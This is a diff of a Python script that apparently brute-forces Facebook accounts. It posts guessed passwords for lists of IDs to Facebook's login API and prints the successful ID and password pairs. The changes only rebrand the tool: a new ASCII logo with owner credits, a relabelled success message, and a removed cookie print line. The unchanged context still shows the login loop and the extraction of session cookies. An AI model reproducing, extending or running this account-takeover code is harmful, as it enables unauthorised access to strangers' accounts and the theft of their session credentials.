@@ -33,7 +33,20 @@ def encmd5(sig):
   return result.hexdigest()
 
 def logo():
-    print('')
+  """
+   ██████████  ██████████  █████████   ▀
+   ███    ███  ███    ███  ███   ███  ███ 
+   ███         ███    ███  ███   ███  ███ 
+   ██████████  ██████████  ███   ███  ███ 
+          ███  ███    ███  ███   ███  ███  
+   ███    ███  ███    ███  ███   ███  ███  
+   ██████████  ███    ███  ███   ███  ███ QUEEN
+\033[1;97m══════════════════════════════════════════════
+ [✓] Owner   : Jannat Sultan
+ [✓] Github  : https://github.com/Jannat-Sultan 
+ [✓] Facebook: Jam Shahrukh Official
+ [✓] don't pheel me:) hatterz make me famous 
+══════════════════════════════════════════════"""
 
 def f_clone():
     #chck()
@@ -145,10 +158,9 @@ def file_c(ids,names,p_list):
   }
             resp = requests.post(url="https://b-api.facebook.com/method/auth.login", data=data, headers=headers)
             if 'c_user' in resp.text:
-                print('\r\033[1;92m [OK] '+ids+' | '+pas)
+                print('\r\033[1;92m [JAM] '+ids+' | '+pas)
                 try:
                     cokei = ";".join(i["name"]+"="+i["value"] for i in resp.json()["session_cookies"])
-                    print(' [ 🍪 ] '+cokei)
                 except:
                     pass
                 oks.append(ids)
